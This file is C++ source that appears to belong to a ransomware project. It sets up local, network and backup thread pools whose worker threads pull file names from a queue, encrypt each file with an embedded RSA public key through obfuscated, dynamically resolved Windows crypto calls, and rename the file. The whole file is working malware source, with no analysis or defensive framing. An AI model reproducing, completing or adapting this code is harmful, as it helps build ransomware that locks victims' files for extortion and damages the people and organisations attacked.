#include "threadpool.h"
#include <wincrypt.h>
#include "locker.h"
#include "api.h"
#include "global_parameters.h"
#include "logs.h"

STATIC threadpool::THREADPOOL_INFO g_LocalThreadPool;
STATIC threadpool::THREADPOOL_INFO g_NetworkThreadPool;
STATIC threadpool::THREADPOOL_INFO g_BackupsThreadPool;
STATIC BYTE g_PublicKey[4096] = "__publickey__";//"\x07\x02\x00\x00\x00\xA4\x00\x00\x52\x53\x41\x32\x00\x10\x00\x00\x01\x00\x01\x00\xB5\xB4\xDC\x55\xFE\x6B\xC0\x05\x65\xD1\xD0\x07\x5F\xDF\xFA\x18\x40\xE0\xD5\xC2\xD2\xF8\xFB\xDA\x37\xF7\x1D\xD6\x90\x8C\xE6\xC0\x67\x33\x91\xAA\x3E\x9A\x99\xFA\x21\x41\x64\xE0\x41\x78\x10\xB7\x36\x17\x59\x6F\xA1\xD3\x7E\x5B\x0B\xC6\xBF\xF5\x89\xFB\x6F\xF4\xE8\xC2\xEC\x96\xD6\x98\xCD\xFD\x58\xFB\xA5\xDF\xD8\x15\x40\x6F\x34\x7D\xF1\xFB\xE1\xEB\x4E\xD2\x4E\x63\x70\x5E\x68\x8E\x42\x1E\xAD\x7E\x85\x40\xFE\x84\xAD\xB6\xE0\xA4\x60\x60\xBB\x01\xC8\xF3\x36\x35\x84\xE1\xD0\x58\x1B\xBE\x58\xCC\x27\x75\x7C\xC5\xB1\xE4\xDE\x3A\x4B\x8C\xD8\x35\x24\x8A\x88\x84\x74\x59\x21\xA2\x3B\xD7\x82\xB2\x17\x00\x89\x83\xE0\x70\x54\xE3\xDF\x5C\x55\x67\x19\x49\xE6\x44\xA0\x20\x22\x3A\x53\x9A\xBF\xCD\x4C\x73\x39\x5A\x53\xA2\xDE\xA5\xFC\x1C\x5F\x5C\x83\xBF\x98\x6E\xBC\x21\x2F\x2F\x50\x77\x79\xF3\x4B\x0D\xB0\xE1\xFC\xE7\x8E\xD5\xDA\x46\x89\xAE\x53\x4F\x5C\xB0\x63\xFA\x3F\x62\x4F\x88\xE0\x27\x4D\x61\xB0\x1E\xDE\x74\x60\x81\xDD\xB5\x52\x74\x0E\x28\x91\x18\xBA\x5C\x94\x99\x45\x8A\xBB\xCD\x89\xE0\x0D\xCC\x2F\x91\x0D\xA4\xBF\x50\xDC\xBC\x45\x0B\x42\xAE\x32\xAB\x1F\x15\xC1\x29\xA3\x7C\x55\x24\x95\xB9\x7D\x17\x03\x32\x81\xC6\x63\x08\x32\xEE\x37\x29\xBE\x91\xC2\x26\x54\xC8\x34\x47\x41\x2C\x51\xFB\x70\x8A\x0C\x35\x3A\xE3\x35\x64\x2A\x4D\xB9\xF2\xD8\x02\x8A\xFE\xBF\xD0\x54\x7F\xDE\x35\xBF\xCC\xD1\x25\xEC\x42\x93\xBE\x0C\xAE\x17\x0E\xB8\x06\x64\x3B\x30\x7A\x37\x14\x18\x83\x6A\x5B\xD7\xB7\x21\x47\x18\xEC\xF1\x93\x75\xBC\xD2\x31\x92\x48\xB2\x8E\x1F\xB5\x78\x10\x0B\x10\x7D\x22\x89\xF0\x5A\x83\xC4\x04\xAF\xA5\x44\x90\xC1\xB6\x82\xBB\x03\x09\x45\x87\xEC\x49\xE4\x46\x58\x70\x96\x07\x6D\x93\xAD\xB6\x47\x4B\xDE\x11\x23\x44\x67\x67\x3E\xE0\x59\x5B\xCD\x6C\x56\x78\xD4\x3B\x17\xBA\x9C\xA1\x40\x86\x16\xFB\xA7\x5C\xDC\x4C\x80\x09\xBF\xDD\xB4\xA8\x0B\xE5\xD4\x44\x0E\x5E\xBD\xC4\xD0\x40\x52\x0D\x42\x13\x10\x2E\xF7\xA6\xA1\xE0\x40\xB1\xB9\x71\x72\xDF\xF1\x92\x85\xCA\x2A\x66\xC6\xA3\x13\x89\x2E\xBB\x1D\x32\xE9\x1E\xDD\x2B\x46\xE3\xDE\xF9\x9A\xE3\x4F\xE2\x9B\x02\xE8\x31\x90\xB7\x58\x97\x9F\x43\x0F\x51\x36\xD9\xAE\x58\xAC\x18\xFC\x0E\x13\xB0\x79\xBA\xD3\xBD\x9F\x58\x55\xB1\x0F\xF2\x0C\x24\x49\x55\xB1\xB7\xBF\x03\xE3\xD1\xA4\xEF\xB5\x3F\x7C\x75\x58\x48\xAA\x97\x12\x35\xA0\xEE\x63\x22\x29\x0D\xD8\x1A\x57\x58\x7F\x58\xC0\x4E\x50\xF2\xA8\x1D\x0F\x65\xB5\xE7\x14\x38\x73\x45\x47\x4D\x0B\x4D\x49\x0F\xD4\x06\x96\xB7\xE0\x4E\x84\xC6\x64\x26\x34\xCD\xA8\x64\xFD\xE2\x51\xE2\x46\x70\x46\x04\x65\x03\x72\xEC\xC7\x4B\x60\xB8\x41\x3A\x6A\x60\x12\xE3\x67\x77\x17\x0C\x63\x76\x99\xEB\x04\x1E\xDD\x8D\x62\xBC\xAA\x96\xE6\x6A\x1F\xEE\xFE\x91\x89\xA7\x95\x35\x6A\x19\xCC\x22\x0D\x37\x60\xFC\x92\x33\xF4\x06\x38\x1E\xEA\x9C\x9C\x2A\x5D\x39\xD4\xF9\xE7\xBA\x79\xDD\x6E\x0E\xEB\x76\x34\x28\x4E\x85\xDF\xE2\xA4\xC6\x47\x42\x98\x28\xD0\x37\xDB\x38\x35\xDD\x36\x3B\x44\x2B\x59\x21\x18\x31\x31\xA1\xD3\xB6\x9D\x25\x0B\xDC\x0F\x5F\x88\x21\x67\xB5\x54\xF4\x3D\xDE\x16\x84\xAB\xE8\x94\x85\x83\x99\xD0\xA3\xA9\x1D\x0E\x34\x40\x03\xE0\x11\x59\x3B\x69\x90\x01\xA4\x3B\x6F\x90\xD7\x50\xC0\xD9\x50\x7E\x55\x79\x2B\x4E\xB8\x36\x9D\x41\x7D\xC8\xC2\x59\xD1\xCB\x84\xE2\xD6\xB9\xCD\x07\x77\xA5\x2D\x61\x68\x81\x22\x12\x31\x14\xC9\xFB\xA0\xFE\x95\xAB\x57\x02\x1A\x04\x0B\xC4\xB4\xDB\x36\x8B\x58\x00\x35\xF2\x4C\xAD\xEB\x75\x7B\x49\xE7\x85\x27\x51\x14\x14\x90\xF6\xB8\x8B\xDC\x69\xA1\x36\x62\xCB\x63\x3A\x94\x9D\xDF\x25\x33\x8E\xFB\x87\x47\xAB\x75\xF8\xEB\x2C\xB5\x91\x9C\xA0\xD2\xE2\x06\xB5\xAD\x32\x73\x9C\x50\x28\x44\x53\x35\xFA\x7A\x32\x83\x67\x39\x20\x47\x7D\xA8\x96\x4D\x03\xC1\x7E\xD1\xF5\xA8\x5E\x11\xF0\x44\x19\x1D\x03\xC7\xBB\xFD\x13\x75\xD8\xC3\xFE\xF4\xFE\xBD\xBB\x24\xC6\x75\xAA\x7B\x4B\x8B\xB9\xA6\x62\x43\xE5\x63\x0E\xC8\xEC\xC6\x25\x5C\x4A\xAF\xA0\x37\x86\x87\xB7\x07\x61\x17\x8F\xC0\x37\xA0\xE0\x6F\x09\x78\x10\x63\x6A\xAC\x1E\xB3\x7C\x1A\xD7\xB3\x7C\x6B\x1A\x75\x34\x94\x5F\xAB\xD7\x39\xF5\x03\xFB\x2D\x38\x30\x5C\xF0\x35\x15\x2E\xE8\xC4\x8D\xEA\x2B\x7C\x6C\xB4\x94\x5B\x7F\x81\x1A\xFF\x96\xD5\xBD\xBC\x9E\x89\x5C\xD8\x45\xE9\x48\xCE\x2B\x70\x5F\xA2\x93\x37\xFC\x27\x7A\xA1\xEE\x27\x08\xA8\x3B\x5F\x1A\xC3\xE1\x1E\xC9\x3D\x50\x52\x84\xEB\x31\xC2\x27\xCC\x15\xF7\x62\x54\xA4\x10\xD1\xB0\x4B\x33\xCA\xA1\x4F\x9C\x64\x71\xC8\x62\xD3\xC4\xE1\xAB\xCB\x50\x4C\xB9\x97\x51\xCA\xE8\x3A\x4D\x13\x6E\x9D\xFB\xCC\x11\xA6\xBC\x48\xCE\x74\x37\x4E\x4F\xAD\xE1\xE1\x8A\x40\xD2\xF7\x00\x24\x3C\x08\x22\x16\xA4\x3F\x5D\x90\xB8\x29\x27\xD1\x31\x75\xCD\xAE\xAA\xB7\xF2\xE0\xB7\xCF\x2F\x31\x2C\xCA\x9C\x83\xDD\x27\x9F\x14\xAC\x88\x9B\xC0\xCF\xB5\xF9\x9D\x6E\xA7\xC5\x04\xDB\x3C\x84\xB5\x37\x49\x86\xD0\x3C\x77\x07\x06\xB7\x1D\xE4\xA4\x56\x07\x9B\xDA\xE2\x4D\x2E\x39\x16\xE1\x8C\xF4\xAF\xDC\x12\x28\xE8\x9A\x79\xCE\x74\xAE\xB5\xFF\x10\xE5\x4F\x7D\x16\xB8\x2A\x1E\x99\x0B\xCB\xF8\x0E\xBD\xC2\x00\x4D\xFF\xDF\x86\x77\x32\xA4\xCB\xAA\xFD\x96\x80\xB2\xFE\xC1\xAB\xB1\x87\x43\x9D\x28\x65\xD5\x80\x77\xB8\x4C\x31\xB7\x3E\xA2\x5B\xC4\x12\x45\x28\x59\x19\xD9\xC0\xA7\x22\xFF\x9B\xAF\xE7\x4B\x00\x07\xB6\x96\xCF\x6B\x9C\x17\x89\x6A\xDA\x61\xC7\x0E\x15\x82\xFA\x93\x53\x8D\x2E\x11\x26\xC2\x01\xE2\xBE\x2B\x11\x7A\xEB\x57\x63\xCF\xB3\x29\xE8\xA0\x45\x5C\x60\x1D\x3F\x44\x5F\x46\x88\x9E\x06\x36\xF2\x41\xCA\xAA\xC5\x26\xFD\x62\xD5\xF9\x68\xFC\x15\x8C\xE3\x90\x82\xEC\x4F\xD2\x44\xAB\x1A\x3A\x96\x6F\x1C\xCE\x91\x96\xED\xD6\xDC\x27\x3E\xC7\x63\x21\x3A\xD7\x67\x6E\x1C\x37\xBC\xF3\x37\x60\x1C\x33\xC7\x77\x4B\xDE\x19\xEB\x09\x1D\xE8\x9F\x7C\x31\xB6\xE2\xEE\x15\x17\x1A\x39\xE2\xF8\x6D\xD1\x43\x3B\x75\x17\xE8\x20\x88\x76\x50\x51\x66\xD8\x61\xB9\x6D\x53\x57\xA7\xDD\x46\x74\x84\xF2\x3F\xF7\x2B\xE9\x14\xF1\xF3\xBD\x09\xCC\x9B\x5B\x18\xD3\xF9\x1E\x6D\x1A\x21\xB4\x50\x05\x7B\x1A\x5F\xF5\x5A\x93\x89\xA3\x38\xA4\x50\x2C\x56\xBE\xC3\xDC\x85\x8E\xED\xB9\x99\x57\xD8\xD7\xCE\xB5\xBD\x1E\xD2\xAD\x18\x09\x4E\xF1\x2F\xFA\xCA\x2D\xCF\x7B\xB9\x00\x9B\x70\xFB\xB1\x61\x12\x1A\xE1\x3D\x30\xDD\xC2\x83\xF4\xD3\x7C\xF8\xF0\x49\xE9\x01\x02\xE3\x25\x1C\xE7\x21\x00\xAF\xBF\xCD\x28\x66\xCF\x1C\x0C\xD4\xF6\x61\x69\x3C\x23\x77\xD4\xA6\x33\xA3\xB7\xD9\x38\xAF\x8D\xFF\x5B\x4A\x83\x06\xE2\x9D\xEC\x41\x30\x8B\xFC\x76\x7F\x2B\x62\xDE\x38\xB8\x87\xDC\x0A\x76\xFF\xE2\xE0\xDF\x2D\x63\xFA\x83\x6C\x28\x0D\xBC\x95\xC7\x4C\x53\xD3\x9E\x69\x93\x4A\xE3\x7E\x90\xA1\x5E\xB0\x49\xF4\x27\x68\x0C\xA9\x82\x0C\xF3\xB3\x54\xA5\xA3\xC7\x6F\x3E\xDE\x08\x5F\xA5\x57\xBA\x51\xFB\xD6\x4B\x10\xF4\x62\x94\x08\x0D\x34\xAC\x6A\x58\x4B\xC0\x15\xE7\xDD\x29\xD2\xFD\x95\x9C\x5A\x4F\xE2\x6C\x29\xEB\xD4\x7A\xA0\xDA\x69\xE7\x45\x53\xDB\x06\x52\x5F\x81\x31\xCD\x1A\x8C\x35\x92\x62\x8B\x09\xBC\xCF\x57\xC2\x0A\x61\x04\x73\x5B\xAF\xBB\xA5\xA5\x80\xE8\x3A\xC1\x80\xB5\x51\x1E\x23\x41\xC3\xC1\x0A\x80\x52\xC5\xB1\x91\x84\xDC\xED\x28\xB2\xC1\x39\x36\x81\x15\xB8\x94\x31\x49\x19\xDE\x0A\xD0\x0F\xA2\x5C\xFA\xAA\xD2\x02\x82\xB7\x3E\x37\x56\x9D\x3F\x4B\x96\xD6\x0F\x87\x69\x87\x10\x00\xFB\x18\x9D\xD2\xE8\xFA\xC4\x51\x4D\x64\x69\x7D\x07\xEC\xE3\x96\x63\xD2\x2F\x09\xA2\x15\x75\xCB\x68\x37\x5F\xB4\xE4\x49\x55\xCF\x5B\x85\x8B\x8E\x15\x65\x28\xB7\x5B\x73\x65\x18\x5A\x71\xEE\xB3\xEF\xF0\x9A\x31\xE9\x53\x0E\xDC\xFA\x96\x53\x3D\xCA\xB0\x7D\x47\x55\xC9\x55\xA7\x40\x18\x9D\xFE\x7C\x8D\xC8\x74\xE3\x7D\x96\x82\xA5\x88\xF4\x15\xB6\x87\x14\x30\x60\x89\x02\x7D\xEE\x51\xE3\x4F\x4F\xFE\x00\x4D\x09\x92\x61\x3B\x9F\xBB\xDE\xC9\x05\x2A\x0C\x3F\x25\x53\xC1\xD7\x23\x6A\xAE\x44\x3A\x2B\xFA\xC7\xAF\xCA\xC4\xD6\x26\xF9\xDF\x9A\x45\xC0\xBC\xF9\xFB\x2C\xE4\x9B\x99\xA6\xB2\xAD\xFF\x70\x0C\x4B\x1E\xB2\x5F\x4B\x91\x52\xDA\x34\x57\x9E\xB2\x3B\x4F\xD9\x24\x41\x2C\x7D\x96\x0A\x26\xDC\x0C\xF0\xB2\x73\x00\x47\xDC\x38\x53\x82\x6E\x25\x7F\x76\x4B\x41\xEF\x6F\x81\x0A\xC3\x98\x56\x5E\x21\xC8\x49\x38\x6E\x21\x24\xE5\x11\x9C\x0F\xE9\x62\x96\x6D\x0B\x67\xCB\x42\xFA\x48\x8A\x57\x8D\x73\xC8\x88\x04\xA8\x9B\xCE\x1D\x96\xF5\xB4\x83\xAD\xA3\xFF\xF5\x61\x14\xBD\xF0\x67\x9B\xE3\x5C\x7F\x12\xFF\x61\x50\xFA\x7E\xC5\x45\x21\xE2\xFF\x38\x7C\x71\xD0\xAF\xE9\xF9\xA1\xAE\x75\x1D\xE8\xFA\x22\xBE\xE2\x71\xF7\x07\x1E\xBD\x14\x4B\x00\x4C\x3E\xA0\x15\xCC\xA3\x5E\x2E\x6C\x40\x9A\x21\x29\x2C\x78\x14\xEC\xEE\x80\x24\x5C\xCC\x32\xA6\x39\x4B\xBA\xA9\x6A\xE9\x29\xB3\x48\x37\xCF\x0A\x44\x1C\x6A\x43\xB8\x29\x7D\xDC\x6D\x34\x8B\xA0\x55\x3D\xDD\x9B\x5F\x2E\x2E\x81\xAF\x2F\x84\xA4\x01\xAC\xEA\x9D\x69\xF9\xB4\x29\x03\x50\x0C\x54\x8C\x02\x90\x31\xC7\x70\xC6\x9C\x76\x8D\xA0\x09\x3B\x94\x01\xAC\x2F\x0B\x56\xC9\x1F\x86\x1D\x99\xF4\x71\xF6\x94\x83\x9C\x39\xE4\xDF\x73\x9A\x1D\x6C\x43\xA4\x28\x18\xFA\xB9\xB6\x02\x70\x66\x34\xAC\xF9\x9B\x16\x25\x8B\xB2\x4B\x45\xC2\x51\xD6\x0F\x63\x80\xDB\xD0\x51\xEB\x41\xCC\x13\xD6\x17\x59\xD7\xCC\x1E\x45\x91\x2B\x3E\x0E\x33\x0C\x09\xB7\x1B\x63\x6E\xA2\x28\x18\xEA\x43\x34\x99\x60\xBC\xC5\x97\x41\xF8\x7C\x50\xF3\x8B\x6F\xE0\x07\xA4\xCF\xC9\x0F\x66\x44\xB1\xC3\xBC\x6A\xFB\xFD\x62\x42\x74\x7D\x23\x70\x9F\x7B\x37\xFF\x69\x9E\xF8\x6A\xC3\x3F\x27\xC5\xAA\xBB\xD9\xD4\x42\xF1\x8A\xCA\x89\x71\xC9\xEC\xDF\xB1\x83\x27\xCD\xA5\xBE\x97\xDE\xE7\x78\xD4\xA9\xE0\xE8\x38\x75\x3F\x98\x6C\x61\xDC\x7B\xC6\xEE\xEA\xA5\xE4\x9A\xA3\xCF\x52\xD0\xC8\x8A\xD1\xDA\xF1\x2B\x0D\x4E\x2E\xCF\x16\x8D\x16\x92\x07\x14\xF9\x68\x97\x15\x4A\x21\xA7\x32\x44\x89\x12\xDC\xA4\x2B\xE8\x83\xC1\xDB\xED\xB1\x86\xBD\x39\x76\x65\x79\x02\x9E\xBA\xD5\xB4\xEE\xE0\x98\x4B\xF8\xC0\x48\x2B\x31\x02\x13\xFF\x32\x15\x53\x3B\xC8\x31\x91\x10\x00\x83\x3D\x2C\xA7\x34\xDC\xD7\xDC\x97\x9B\x41\x74\xEE\x6D\xC8\x9B\x81\x9E\x8C\xBA\xB9\x61\x81\xDE\xBA\xFD\x7B\xCF\xFA\xE7\x68\xD7\xF0\x9A\xC7\x5C\x3F\x16\x78\x6E";

STATIC threadpool::PTHREADPOOL_INFO GetThreadPoolInfo(INT ThreadPoolId)
{
	if (ThreadPoolId == threadpool::THREADPOOLS::LOCAL_THREADPOOL)
		return &g_LocalThreadPool;
	if (ThreadPoolId == threadpool::THREADPOOLS::NETWORK_THREADPOOL)
		return &g_NetworkThreadPool;
	if (ThreadPoolId == threadpool::THREADPOOLS::BACKUPS_THREADPOOL)
		return &g_BackupsThreadPool;

	return NULL;
}

STATIC
BOOL
GetCryptoProvider(__out HCRYPTPROV* CryptoProvider)
{
	BOOL bSuccess = (BOOL)pCryptAcquireContextA(CryptoProvider, NULL, OBFA(MS_ENH_RSA_AES_PROV_A), PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	if (bSuccess) {
		return TRUE;
	}

	bSuccess = (BOOL)pCryptAcquireContextA(CryptoProvider, NULL, OBFA(MS_ENH_RSA_AES_PROV_A), PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET);
	if (bSuccess) {
		return TRUE;
	}

	bSuccess = (BOOL)pCryptAcquireContextA(CryptoProvider, NULL, OBFA(MS_ENH_RSA_AES_PROV_XP_A), PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	if (bSuccess) {
		return TRUE;
	}

	bSuccess = (BOOL)pCryptAcquireContextA(CryptoProvider, NULL, OBFA(MS_ENH_RSA_AES_PROV_XP_A), PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET);
	return bSuccess;
}

STATIC
DWORD
WINAPI
ThreadHandler(__in threadpool::PTHREADPOOL_INFO ThreadPool)
{

	HCRYPTKEY RsaKey;
	HCRYPTPROV CryptoProvider;
	locker::FILE_INFO FileInfo;

	LPVOID Buffer = pVirtualAlloc(NULL, BufferSize + 64, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!Buffer) {
		pExitThread(EXIT_SUCCESS);
	}

	if (!GetCryptoProvider(&CryptoProvider)) {
		pExitThread(EXIT_FAILURE);
	}

	if (!pCryptImportKey(CryptoProvider, g_PublicKey, sizeof(g_PublicKey), 0, 0, &RsaKey)) {
		pExitThread(EXIT_FAILURE);
	}

	while (TRUE) {

		RtlSecureZeroMemory(&FileInfo, sizeof(FileInfo));
		threadpool::PTASK_INFO TaskInfo = NULL;

		pEnterCriticalSection(&ThreadPool->ThreadPoolCS);
		{
			TaskInfo = TAILQ_FIRST(&ThreadPool->TaskList);
			if (!TaskInfo) {

				pLeaveCriticalSection(&ThreadPool->ThreadPoolCS);
				pSleep(500);
				continue;

			}

			ThreadPool->TasksCount--;
			if (ThreadPool->IsWaiting && ThreadPool->TasksCount <= (MAX_TASKS / 2)) {

				pSetEvent(ThreadPool->hQueueEvent);
				ThreadPool->IsWaiting = FALSE;

			}

			TAILQ_REMOVE(&ThreadPool->TaskList, TaskInfo, Entries);
		}
		pLeaveCriticalSection(&ThreadPool->ThreadPoolCS);

		if (TaskInfo->FileName == STOP_MARKER) {
			pExitThread(EXIT_SUCCESS);
		}

		FileInfo.Filename = TaskInfo->FileName.c_str();
		FileInfo.FileHandle = INVALID_HANDLE_VALUE;

		if (global::GetEncryptMode() == BACKUPS_ENCRYPT) {

		}
		else {

			if (locker::Encrypt(&FileInfo, (LPBYTE)Buffer, CryptoProvider, RsaKey))
			{

				pCloseHandle(FileInfo.FileHandle);
				FileInfo.FileHandle = INVALID_HANDLE_VALUE;
				locker::ChangeFileName(FileInfo.Filename);

			}
			
		}
		
		locker::CloseFile(&FileInfo);
		delete TaskInfo;

	}

	pExitThread(EXIT_SUCCESS);
}

BOOL 
threadpool::Create(
	__in INT ThreadPoolId, 
	__in SIZE_T ThreadsCount
	)
{
	PTHREADPOOL_INFO ThreadPool = NULL;
	ThreadPool = ::GetThreadPoolInfo(ThreadPoolId);
	if (ThreadPool == NULL) {
		return FALSE;
	}

	ThreadPool->IsWaiting = FALSE;

	ThreadPool->hQueueEvent = pCreateEventA(NULL, FALSE, FALSE, NULL);
	if (!ThreadPool->hQueueEvent) {
		return FALSE;
	}

	ThreadPool->hThreads = (PHANDLE)m_malloc(sizeof(HANDLE) * ThreadsCount);
	if (!ThreadPool->hThreads) {
		return FALSE;
	}

	TAILQ_INIT(&ThreadPool->TaskList);
	ThreadPool->TasksCount = 0;
	ThreadPool->ThreadsCount = ThreadsCount;
	pInitializeCriticalSection(&ThreadPool->ThreadPoolCS);
	return TRUE;
}

BOOL 
threadpool::Start(__in INT ThreadPoolId)
{
	PTHREADPOOL_INFO ThreadPool = NULL;
	ThreadPool = ::GetThreadPoolInfo(ThreadPoolId);
	if (ThreadPool == NULL) {
		return FALSE;
	}

	for (SIZE_T i = 0; i < ThreadPool->ThreadsCount; i++) {
		ThreadPool->hThreads[i] = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ThreadHandler, ThreadPool, 0, NULL);
	}

	return TRUE;
}

VOID
threadpool::Wait(__in INT ThreadPoolId)
{
	PTHREADPOOL_INFO ThreadPool = NULL;
	ThreadPool = ::GetThreadPoolInfo(ThreadPoolId);
	if (ThreadPool == NULL) {
		return;
	}

	for (SIZE_T i = 0; i < ThreadPool->ThreadsCount; i++) {

		threadpool::PutTask(ThreadPoolId, STOP_MARKER);

	}

	pWaitForMultipleObjects(ThreadPool->ThreadsCount, ThreadPool->hThreads, TRUE, INFINITE);
}

VOID 
threadpool::Delete(__in INT ThreadPoolId)
{
	PTHREADPOOL_INFO ThreadPool = NULL;
	ThreadPool = ::GetThreadPoolInfo(ThreadPoolId);
	if (ThreadPool == NULL) {
		return;
	}


	for (SIZE_T i = 0; i < ThreadPool->ThreadsCount; i++) {
		pCloseHandle(ThreadPool->hThreads[i]);
	}

	pDeleteCriticalSection(&ThreadPool->ThreadPoolCS);
	m_free(ThreadPool->hThreads);
	m_free(ThreadPool);
}

VOID 
threadpool::SuspendThread(INT ThreadPoolId)
{
	PTHREADPOOL_INFO ThreadPool = NULL;
	ThreadPool = ::GetThreadPoolInfo(ThreadPoolId);
	if (ThreadPool == NULL) {
		return;
	}

	pWaitForSingleObject(ThreadPool->hQueueEvent, INFINITE);
}

INT 
threadpool::PutTask(
	__in INT ThreadPoolId, 
	__in std::wstring Filename
	)
{
	PTHREADPOOL_INFO ThreadPool = NULL;
	ThreadPool = ::GetThreadPoolInfo(ThreadPoolId);
	if (ThreadPool == NULL) {
		return FALSE;
	}

	PTASK_INFO Task = new TASK_INFO;
	if (!Task) {

		logs::Write(OBFW(L"Can't add file %s to file list."), Filename.c_str());
		return FALSE;

	}

	Task->FileName = Filename;
	INT TasksCount = 0;

	pEnterCriticalSection(&ThreadPool->ThreadPoolCS); {

		ThreadPool->TasksCount++;
		TasksCount = ThreadPool->TasksCount;
		TAILQ_INSERT_TAIL(&ThreadPool->TaskList, Task, Entries);

		if (!ThreadPool->IsWaiting && TasksCount >= MAX_TASKS) {
			ThreadPool->IsWaiting = TRUE;
		}

	}
	pLeaveCriticalSection(&ThreadPool->ThreadPoolCS);
	return TasksCount;
}